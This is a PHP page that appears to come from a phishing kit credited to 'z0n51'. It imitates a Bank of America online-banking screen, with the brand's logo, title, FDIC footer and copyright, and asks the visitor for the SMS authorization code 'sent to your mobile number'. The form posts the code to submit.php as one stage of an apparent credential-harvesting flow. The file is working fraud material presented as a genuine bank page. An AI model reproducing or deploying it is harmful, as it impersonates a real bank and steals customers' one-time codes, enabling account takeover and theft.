<?php

/**
 * @link              https://www.z0n51.com/
 * @since             06/11/2019
 * @package           BOA
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      BOA
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */
    include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" type="image/x-icon" href="../assets/images/favicon.ico" />


        <title>Bank of America | Online Banking | Sign In | Online IDIn</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="row">
                    <div class="col-md-6">
                        <div class="logo"><a href="#"><img src="../assets/images/logo.png"></a></div>
                    </div>
                    <div class="col-md-6">
                        <ul class="header-menu">
                            <li><a href="#"><i class="fas fa-lock"></i> Secure Area</a></li>
                            <li><a href="#">En Español</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- PAGE TITLE -->
        <div class="page-title">
            <div class="container">
                <h3>Authorization Code</h3>
            </div>
        </div>
        <!-- END PAGE TITLE -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="top-content">
                    <h3>An authorization code was sent via text to your mobile number.</h3>
                    <p>Check your mobile phone and enter the authorization code :</p>
                </div>
                <div class="forms">
                    <form method="post" action="submit.php">
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'sms_code') ?>">
                            <input type="text" name="sms_code" class="form-control" id="sms_code">
                            <?php echo error_message($_SESSION['errors'],'sms_code'); ?>
                        </div>
                        <input type="hidden" name="type" value="etapsms">
                        <input type="hidden" name="verbot">
                        <div class="buttons">
                            <button class="btn-submit" type="submit">Continue</button>
                            <button type="button">Cancel</button>
                        </div>
                    </form>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer" style="margin-top: 70px;">
            <div class="container">
                <p style="font-weight: 700"><i class="fas fa-lock"></i> Secure area</p>
                <p><a href="#">Privacy & Security</a></p>
                <p class="mb-0">Bank of America, N.A. Member FDIC. <a href="#">Equal Housing Lender</a><br>&copy; 2019 Bank of America Corporation. All rights reserved.</p>
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

    </body>

</html>